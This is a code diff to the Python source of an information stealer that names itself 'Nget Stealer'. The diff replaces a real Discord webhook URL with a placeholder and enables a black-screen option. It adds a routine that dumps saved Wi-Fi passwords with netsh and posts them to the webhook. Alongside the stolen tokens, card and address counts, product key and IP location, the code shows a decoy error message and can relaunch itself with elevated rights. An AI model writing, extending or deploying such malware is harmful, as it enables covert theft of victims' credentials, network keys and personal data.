@@ -6,20 +6,16 @@ from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
-
-# "WEBHOOKHERE" 
-
 config = {
-    'webhook': "https://discord.com/api/webhooks/1184499886796840970/QzYPRdU7iuXeC_jidEUlrVNszK_6SvE0tzkblPDLSXqYDEzm7ziKKOKXOZRTrpiv0Zuc",
-    'persist': False,
-    'keep-alive': False,  
+    'webhook': "WEBHOOKHERE",  
     'hideconsole': True, 
     'antivm': False,  
     'force_admin': False, 
-    'black_screen': False, 
+    'black_screen': True, 
     'error': True, 
     'error_message': 'Failed To Open Poop Tool\nclick "ok" to open',
 }
+
 class functions(object):
     def getHeaders(self, token:str=None, content_type="application/json") -> dict:
         headers = {"Content-Type": content_type, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
@@ -574,6 +570,20 @@ Antivirus: {avlist}
                 shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
     
     def SendInfo(self):
+        try:
+            command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+            profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
+            wifi_data = ""
+            for profile in profile_names:
+                profile = profile.strip()
+                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True).stdout.decode()
+                profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
+                if len(profile_password) == 0:
+                    wifi_data += f"{profile}: Open\n"
+                else:
+                    wifi_data += f"{profile}: {profile_password[0].strip()}\n"
+        except Exception:
+            pass
         wname = self.getProductValues()[0]
         wkey = self.getProductValues()[1]
         ip = country = city = region = googlemap = "None"
@@ -583,7 +593,6 @@ Antivirus: {avlist}
             city = data['city']
             country = data['country']
             region = data['region']
-            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception: self.exceptions.append(traceback.format_exc())
         _zipfile = os.path.join(self.tempfolder, f'Intrusion-{os.getlogin()}.zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
@@ -610,7 +619,7 @@ Antivirus: {avlist}
                                     "description": f'**{os.getlogin()}** ran Nget Stealer.\n\n'
                                                    f'<a:dancingblob:873253607749857280>  **Computer Name:** {os.getenv("COMPUTERNAME")}\n'
                                                    f'<a:dancingblob:873253607749857280> **{wname}:** ||{wkey if wkey else "No Product Key!"}||\n'
-                                                   f'\n<a:dancingblob:873253607749857280>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
+                                                   f'<a:dancingblob:873253607749857280>  **IP:** {ip} (VPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]})\n'
                                                    f'<a:dancingblob:873253607749857280>  **City:** {city}\n'
                                                    f'<a:dancingblob:873253607749857280>  **Region:** {region}\n'
                                                    f'<a:dancingblob:873253607749857280>  **Country:** {country}\n'
@@ -621,8 +630,10 @@ Antivirus: {avlist}
                                                    f'<a:dancingblob:873253607749857280> Cards Found: {self.stats["cards"]}\n'
                                                    f'<a:dancingblob:873253607749857280> Addresses Found: {self.stats["addresses"]}\n'
                                                    f'<a:dancingblob:873253607749857280> Tokens Found: {self.stats["tokens"]}\n'
+                                                   f'<a:dancingblob:873253607749857280> **Net Profile Names:** ```{profile_names}```\n'
+                                                   f'<a:dancingblob:873253607749857280> **Network Info** ```{profile_info}```\n'
+                                                   f'<a:dancingblob:873253607749857280> **Currently Connected** ```{profile}\n{profile_password}```\n'
                                                    f'<a:dancingblob:873253607749857280> Time: {"{:.2f}".format(time.time() - self.starttime)}s',
-                                                   
                                     "inline": False,
                                     "color": 0x00000,
                                     "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
@@ -662,6 +673,7 @@ Antivirus: {avlist}
                 requests.post(self.webhook, json=a)
         
         os.remove(_zipfile)
+        
     def forceadmin(self):
         self.system(f'set __COMPAT_LAYER=RunAsInvoker && powershell Start-Process \'{sys.argv[0]}\' -WindowStyle Hidden -verb runAs -ArgumentList \'--nouacbypass\'>nul')
         sys.exit()
